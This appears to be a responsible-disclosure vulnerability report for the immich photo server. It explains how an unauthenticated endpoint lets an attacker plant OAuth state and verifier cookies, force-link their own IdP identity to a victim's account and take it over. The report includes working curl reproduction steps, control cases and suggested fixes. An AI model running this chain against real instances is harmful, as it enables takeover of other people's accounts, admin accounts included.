repo.description:
## Summary

`POST /api/oauth/authorize` needs no authentication and copies a caller-supplied `state` straight into the
`immich_oauth_state` cookie on the response. `POST /api/oauth/link` then accepts that cookie as evidence that the
current session started the OAuth flow, but nothing ties the cookie to a session or a user.

So an attacker can pick the value of the CSRF token, get it planted in a victim's browser, and hand the victim a
callback URL carrying an authorization code for the attacker's own IdP identity. The victim's browser links that
identity onto the victim's immich account without asking. After that the attacker signs in with their own IdP
credentials and gets the victim's session.

The fix for GHSA-3832-6r8h-9cfm (CVE-2025-43856) was to validate `state`. It is validated, just not against
anything the server chose.

I ran the whole chain against a clean v3.1.0 instance on your official images, including a negative control and
two controls covering the PKCE case. Transcripts below.

## Why the parameters exist, and where it goes wrong

The mobile app generates `state` and a PKCE verifier on the device, sends only the challenge to `/authorize`
(`mobile/lib/services/oauth.service.dart:14,23-24`), and passes `state` and `codeVerifier` back explicitly in the
callback body (`:34,44`). That flow is self-contained and fine. `OAuthCallbackSchema` already accepts both
(`server/src/dtos/auth.dto.ts:105-111`).

The problem is that the server *also* writes those caller-supplied values into the responding browser as cookies,
and the web flow trusts them. Mobile never needs the cookie; the browser is the only consumer, and the browser is
exactly who an attacker can aim a `Set-Cookie` at.

## Details

`OAuthConfigSchema` takes `state` and `codeChallenge` as free client input:

    // server/src/dtos/auth.dto.ts:113-118
    const OAuthConfigSchema = z.object({
      redirectUri: z.string()...,
      state: z.string().optional()...,
      codeChallenge: z.string().optional()...,
    })

The route has no `@Authenticated()` (`server/src/controllers/oauth.controller.ts:39`), and the guard lets
undecorated routes through:

    // server/src/middleware/auth.guard.ts:90-92
    const options = this.reflector.getAllAndOverride<AuthenticatedOptions | undefined>(MetadataKey.AuthRoute, targets);
    if (!options) {
      return true;
    }

The caller's value beats the server's randomness, and supplying a challenge nulls the verifier:

    // server/src/repositories/oauth.repository.ts:46-53
    state ??= randomState();
    let codeVerifier: string | null;
    if (codeChallenge) {
      codeVerifier = null;
    } else {
      codeVerifier = randomPKCECodeVerifier();
      codeChallenge = await calculatePKCECodeChallenge(codeVerifier);
    }

Both land in the browser at `server/src/controllers/oauth.controller.ts:50-59`, via
`respondWithCookie` with `path: '/'`, `sameSite: 'lax'`, `httpOnly: true` and a 400-day `maxAge`
(`server/src/utils/response.ts:8-12,28`). Express serialises a non-string cookie value as
`'j:' + JSON.stringify(value)`, so a null verifier ships as the literal text `j:null`. That matters because
`link()` rejects an empty verifier but is happy with a six-character constant:

    // server/src/services/auth.service.ts:412-419
    const expectedState = dto.state ?? this.getCookieOauthState(headers);
    if (!expectedState?.length) {
      throw new BadRequestException('OAuth state is missing');
    }
    const codeVerifier = dto.codeVerifier ?? this.getCookieCodeVerifier(headers);
    if (!codeVerifier?.length) {
      throw new BadRequestException('OAuth code verifier is missing');
    }

Neither cookie is checked against `auth.session.id` or `auth.user.id`. The only other gate is at
`server/src/services/auth.service.ts:428-432`, which rejects the case where the attacker's `sub` already belongs
to a different immich user. Whether the victim already has an `oauthId` is never considered, so an existing
legitimate link gets overwritten at `:441`. Login then resolves on it (`:320`,
`await this.userRepository.getByOAuthId(profile.sub)`).

The web side closes the loop on its own: `OauthSettings.svelte:14-18` calls `oauth.link(location)` on mount
whenever the URL carries `code=`, and `web/src/lib/utils.ts:341` sends only `{ url }`, so the server falls back to
the planted cookies.

## Reproduction

Fresh v3.1.0, official images, OAuth enabled, `<host>/user-settings` registered as a redirect URI per your docs.
Victim signed in. Attacker holds an ordinary account at the same IdP.

Step 1, plant the cookies with no credentials at all:

    curl -i -X POST https://immich.example/api/oauth/authorize \
      -H 'Content-Type: application/json' \
      -d '{"redirectUri":"https://immich.example/user-settings",
           "state":"zz-attacker-state",
           "codeChallenge":"k_T62Z7cZzRuIxSs9OucFDXFcmjSudQncD00laiXpng"}'

    HTTP/1.1 201 Created
    Set-Cookie: immich_oauth_state=zz-attacker-state; Max-Age=34560000; Path=/; HttpOnly; SameSite=Lax
    Set-Cookie: immich_oauth_code_verifier=j%3Anull; Max-Age=34560000; Path=/; HttpOnly; SameSite=Lax

In a real attack that request is a cross-site top-level form POST, so the cookies land in the victim's browser.
The challenge above is just `S256("j:null")`.

Step 2, the attacker completes a normal authorization at the IdP as themselves, with
`redirect_uri=https://immich.example/user-settings` and `state=zz-attacker-state`, and keeps the code unspent.

Step 3, negative control. Same link request, no planted cookies:

    curl -X POST https://immich.example/api/oauth/link \
      -H "Authorization: Bearer <victim session>" -H 'Content-Type: application/json' \
      -d '{"url":"https://immich.example/user-settings?code=<CODE>&state=zz-attacker-state&iss=..."}'

    HTTP 400  {"message":"OAuth state is missing"}

That is your CVE-2025-43856 fix doing its job, and it is what the attack has to get past.

Step 4, the attack. Byte-identical request plus the two cookies:

    curl -X POST https://immich.example/api/oauth/link \
      -H "Authorization: Bearer <victim session>" -H 'Content-Type: application/json' \
      -H 'Cookie: immich_oauth_state=zz-attacker-state; immich_oauth_code_verifier=j%3Anull' \
      -d '{"url":"https://immich.example/user-settings?code=<CODE>&state=zz-attacker-state&iss=..."}'

    HTTP 200  {"email":"victim@lab.test", ... ,"oauthId":"mallory"}

Database went from `victim@lab.test -> <none>` to `victim@lab.test -> mallory`.

Step 5, takeover. The attacker clicks the normal OAuth login button and authenticates as themselves:

    POST /api/oauth/callback  ->  HTTP 201
    { "userEmail": "victim@lab.test", "userId": "bc438732-...", ... }

`GET /api/users/me` with that token returns `victim@lab.test`. Reading the victim's assets works, and
`POST /api/api-keys {"permissions":["all"]}` gives persistence that outlives a logout or a password change.

Repeating steps 1 through 5 against the instance admin gave `userEmail=admin@lab.test, isAdmin=true` and a
working `GET /api/admin/users` listing every account.

## Impact

Anyone holding an ordinary account at the configured IdP can take over an arbitrary immich account, admins
included, and keep access with an API key afterwards. They get the library, shared albums, partner shares and
settings.

What they don't get: the password, the PIN, or locked-gallery contents. `changePassword` still wants the current
password and `unlockSession` still wants the PIN.

## Which deployments are affected

I measured this in both directions rather than assuming, because the planted verifier is the fixed six-character
string `j:null` and PKCE decides whether that survives the token exchange.

Exploitable when the IdP does not advertise `code_challenge_methods_supported`. Your own merged PR #18725
documents Microsoft Entra ID as one of those. `oauth.repository.ts:88` then sends no verifier at all
(`supportsPKCE() ? codeVerifier : undefined`) and the exchange succeeds. This is the case I proved end to end.

Not exploitable when the IdP advertises S256, which covers Keycloak, Authelia, Authentik and Google. I tried it
twice, once with the attacker's code not bound to PKCE and once bound to `S256("j:null")`. Both died at the token
endpoint with `code_verifier must be a string with a minimum length of 43 characters`, per RFC 7636 §4.1, and the
victim's `oauthId` stayed empty. An attacker can't plant a verifier of legal length either: leaving out
`codeChallenge` makes the server generate one it never hands to a third party, and supplying one pins the cookie
to the constant.

Other preconditions: OAuth turned on, which is not the shipped default; `<host>/user-settings` registered as a
redirect URI, which your docs tell admins to do; and one click from a signed-in victim.

I'd score it `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`, so High rather than Critical. You rated the same
impact class High on CVE-2025-43856, and this needs a victim click and a non-PKCE IdP on top.

## Suggested fixes

The smallest change that closes it: stop writing the state and verifier cookies when the caller supplied those
values. Mobile already returns them in the callback body, so it loses nothing, and the browser flow stops
accepting values an attacker chose.

Beyond that, `respondWithCookie` shouldn't emit a cookie for a null value at all, since `j:null` is a usable
constant rather than an absent one; `/oauth/link` would be better keying pending state off `session.id` than off
a cookie; and overwriting a non-empty `oauthId` is worth a re-authentication prompt.

## Note on method

An LLM helped me find and write this up. Following your policy, I confirmed every step myself against a fresh
v3.1.0 instance running the official container images, negative control included. One thing I reasoned about
rather than executed in a browser: the cross-site top-level POST that plants the cookie. The server-side
`Set-Cookie` emission is in step 1 above, and `SameSite=Lax` does not stop a cookie being set on a top-level
navigation response.

My lab IdP was your own e2e auth server (`packages/e2e-auth-server`, oidc-provider v9) with two changes:
`http://172.26.0.1:2283/user-settings` added to `redirect_uris`, and `code_challenge_methods_supported` removed
from discovery to stand in for Entra. `oauth.allowInsecureRequests` was on because that IdP speaks plain HTTP
locally; it plays no part in the bug.

Happy to be credited as `zer0d4y5` if you publish an advisory.
repo.summary: Attacker-chosen OAuth `state` cookie allows forced account linking and takeover of any account (bypasses the CVE-2025-43856 fix)
